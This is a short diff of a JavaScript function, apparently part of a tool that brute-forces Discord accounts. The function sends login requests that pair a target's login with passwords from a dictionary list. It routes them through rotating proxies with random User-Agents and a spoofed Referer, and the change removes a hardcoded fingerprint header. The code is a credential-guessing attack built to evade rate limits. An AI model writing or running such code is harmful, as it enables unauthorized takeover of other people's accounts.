@@ -65,7 +65,6 @@ async function Check(proxies, proxy_index){
             "User-Agent": Random_UserAgent.getRandom(),
             "Referer": "https://discord.com/login",
             "x-debug-options": "bugReporterEnabled",
-            "x-fingerprint": "885667969202532392.KwSis9mXbyL0WgBiyD17HZIXzaw"
         },
         body: JSON.stringify({ "login": Self_Args[0], "password": Dictionary[dictionary_index], "undelete": false, "captcha_key": null, "login_source": null, "gift_code_sku_id": null }),
         proxy: `http://${proxies[proxy_index]}`
